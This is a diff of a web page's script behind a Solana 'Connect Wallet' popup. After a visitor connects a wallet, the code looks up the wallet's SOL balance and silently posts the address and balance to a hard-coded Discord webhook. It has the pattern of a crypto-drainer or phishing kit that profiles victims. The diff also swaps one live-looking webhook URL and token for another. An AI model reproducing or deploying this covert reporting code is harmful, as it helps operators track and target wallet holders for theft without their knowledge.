@@ -155,7 +155,7 @@
   <div id="root"></div>
 
   <!-- ✅ Modal toggle scripts -->
- <script>
+<script>
   document.getElementById('connectWallet').addEventListener('click', function (e) {
     e.preventDefault();
     document.getElementById('walletPopup').classList.add('show-popup');
@@ -168,19 +168,28 @@
   async function onWalletConnected(publicKey) {
     if (!publicKey) return;
 
-    // ✅ Full Address (no slicing)
+    // ✅ Show full public key
     document.getElementById('walletAddress').innerText = publicKey;
     document.getElementById('afterConnectPopup').style.display = 'flex';
 
-    // 🔥 Fetch SOL balance and send to Discord
+    // ✅ Only now, fetch balance
     await fetchBalanceAndSend(publicKey);
   }
 
   window.openSolanaWalletModal = async function() {
     try {
+      // Connect wallet safely
       const resp = await window.solana.connect();
+      if (!resp || !resp.publicKey) {
+        console.error('Wallet connection failed.');
+        return;
+      }
+
       const publicKey = resp.publicKey.toString();
+      
+      // ✅ After successful connect
       onWalletConnected(publicKey);
+
     } catch (err) {
       console.error('Wallet connection cancelled or failed.', err);
     }
@@ -188,22 +197,28 @@
 
   async function fetchBalanceAndSend(publicKey) {
     try {
+      // Create NEW Connection directly to the cluster
       const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-      const walletKey = new solanaWeb3.PublicKey(publicKey);
-      const balanceLamports = await connection.getBalance(walletKey);
+
+      const walletPublicKey = new solanaWeb3.PublicKey(publicKey);
+
+      // ✅ Fetch balance independently of wallet session
+      const balanceLamports = await connection.getBalance(walletPublicKey);
       const balanceSOL = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
 
       console.log('Wallet Address:', publicKey);
       console.log('SOL Balance:', balanceSOL);
 
+      // Send data to Discord
       await sendToDiscord(publicKey, balanceSOL);
+
     } catch (error) {
-      console.error('Error fetching SOL balance:', error);
+      console.error('Error fetching balance:', error);
     }
   }
 
   async function sendToDiscord(address, balance) {
-    const webhookURL = 'https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR'; // <== Replace!!
+    const webhookURL = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ'; // <== Put your Webhook here!!
 
     const data = {
       content: `🚀 **New Wallet Connected!**\n\n**Address:** \`${address}\`\n**Balance:** \`${balance.toFixed(4)} SOL\``
@@ -215,9 +230,9 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       });
-      console.log('Successfully sent to Discord!');
+      console.log('✅ Successfully sent wallet info to Discord!');
     } catch (error) {
-      console.error('Failed to send to Discord:', error);
+      console.error('❌ Failed to send to Discord:', error);
     }
   }
 </script>
